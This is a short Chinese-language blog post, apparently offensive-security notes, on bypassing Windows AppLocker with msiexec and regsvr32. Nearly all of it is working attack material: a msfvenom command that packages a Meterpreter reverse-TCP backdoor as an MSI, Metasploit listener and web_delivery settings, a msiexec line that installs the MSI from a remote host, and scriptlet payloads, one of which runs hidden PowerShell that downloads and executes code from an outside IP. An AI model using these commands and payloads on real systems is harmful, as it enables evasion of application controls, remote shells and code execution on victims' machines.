Title: Bypass Applocker with msiexec
Category: Learning
Date: 2017-5-22
slug: msiexec

<https://evi1cg.me/archives/Bypassing_Applocker_with_msiexec.html>

* 使用msf生成反弹的后门：

`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=x.x.x.x lport=xxx -f msi > rever.msi`


* 服务器监听

```
use exploit/multi/handler
set lhost x.x.x.x
set lport xx
set payload windows/x64/meterpreter/reverse_tcp
exploit
```
* 在服务器上面加载：

`msiexec /q /i http://xxx.com/rever.msi` 


##regsrv32

<https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-regsvr32-exe/>

```
regsvr32 /s /n /u /i:1.sct scrobj.dll
```

弹计算器：

```
<?XML version="1.0"?>
  <scriptlet>
    <registration     
      progid="PoC"
      classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
      <!-- Proof Of Concept - Casey Smith @subTee -->
      <!--  License: BSD3-Clause -->
     <script language="JScript">
       <![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); ]]>
     </script>
   </registration>
 </scriptlet>
```
 
###MSF

```
use exploit/multi/script/web_delivery
set LHOST <ip address>
set LPORT <port>
set target 2
exploit -j
```

```


<?XML version="1.0"?>
  <scriptlet>
    <registration 
      progid="PoC"
      classid="{F0001111-0000-0000-0000-0000FEEDACDC}" > 
     <!-- Proof Of Concept - Casey Smith @subTee --> 
     <!--  License: BSD3-Clause --> 
      <script language="JScript"> 
        <![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -nop -w hidden -c $y=new-object net.webclient;$y.proxy=[Net.WebRequest]::GetSystemWebProxy();$y.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $y.downloadstring('http://192.168.157.130:8080/dxVDB2e');"); ]]>
     </script>
   </registration>
  </scriptlet>
```